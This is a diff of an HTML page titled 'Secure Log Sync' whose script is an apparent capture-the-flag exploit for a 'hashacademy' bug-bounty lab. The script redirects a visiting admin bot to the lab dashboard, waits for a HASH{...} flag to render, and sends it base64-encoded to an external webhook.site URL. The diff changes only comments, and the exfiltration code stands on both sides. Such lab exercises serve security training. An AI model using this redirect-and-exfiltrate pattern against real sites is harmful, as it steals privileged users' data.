@@ -3,28 +3,26 @@
 <head><title>Secure Log Sync</title></head>
 <body>
     <script>
-       // GitHub: sajaabuhussein.github.io/trigger.html
-const webhook = "https://webhook.site/ab7f9788-3a2f-41f5-9c2d-84fb65487cc8";
+     const webhook = "https://webhook.site/ab7f9788-3a2f-41f5-9c2d-84fb65487cc8";
 
 const hunt = () => {
     const bodyText = document.body.innerText;
     const match = bodyText.match(/HASH\{[^}]+\}/);
     
     if (match) {
-        // SUCCESS: Flag found!
+        // This sends the flag to your webhook
         fetch(webhook + "?WIN=" + btoa(match[0]));
     } else {
-        // RETRY: Flag not rendered yet (waiting for hydration)
+        // If the flag isn't loaded yet, try again in 1 second
         setTimeout(hunt, 1000);
     }
 };
 
-// If the script is running INSIDE the lab domain
 if (window.location.host.includes("hashacademy")) {
-    // Wait 3 seconds for the initial dashboard skeleton to fill with data
+    // We are inside the lab! Start hunting.
     setTimeout(hunt, 3000);
 } else {
-    // If the AdminBot is visiting the GitHub page directly, send it to the lab
+    // We are on GitHub! Send the bot to the lab.
     window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
 }
     </script>
